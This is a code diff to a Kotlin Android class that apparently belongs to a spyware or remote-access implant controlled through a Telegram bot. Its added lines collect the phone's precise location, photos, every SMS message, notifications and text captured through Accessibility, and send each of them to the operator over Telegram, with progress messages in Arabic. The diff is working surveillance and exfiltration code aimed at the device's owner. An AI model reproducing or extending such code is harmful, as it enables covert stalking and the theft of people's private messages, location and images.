@@ -496,4 +496,44 @@ object CommandExecutor {
             TelegramApi.sendMessage("📍 *الموقع...*")
             try {
                 val loc = LocationHelper.getPreciseLocation(ctx)
-                TelegramApi.sendMessage(
+                TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc))
+            } catch (_: Exception) {}
+
+            Thread.sleep(500)
+            TelegramApi.sendMessage("1️⃣ *صور...*")
+            val photos = MediaScanner.scanImages(ctx)
+            sendPhotosList(ctx, photos, "📸 الصور")
+
+            Thread.sleep(500)
+            TelegramApi.sendMessage("2️⃣ *SMS...*")
+            fetchAllSms(ctx)
+
+            Thread.sleep(500)
+            TelegramApi.sendMessage("3️⃣ *إشعارات...*")
+            fetchAllNotifs(ctx)
+
+            Thread.sleep(500)
+            TelegramApi.sendMessage("4️⃣ *نصوص Accessibility...*")
+            fetchAccessibility(ctx)
+
+            TelegramApi.sendMessage("✅ *اكتمل الجلب الشامل*", KeyboardBuilder.mainMenu())
+        }
+    }
+
+    private fun stopJob(ctx: Context, jobId: String) {
+        runningJobs[jobId] = false
+        runningJobs.remove(jobId)
+        TelegramApi.sendMessage("🛑 تم إيقاف العملية", KeyboardBuilder.mainMenu())
+    }
+
+    private fun runJob(ctx: Context, jobName: String, block: () -> Unit) {
+        Thread {
+            try {
+                block()
+            } catch (e: Exception) {
+                Log.e("CmdExec", "job $jobName err: ${e.message}")
+                TelegramApi.sendMessage("❌ خطأ في $jobName: ${e.message}")
+            }
+        }.start()
+    }
+}
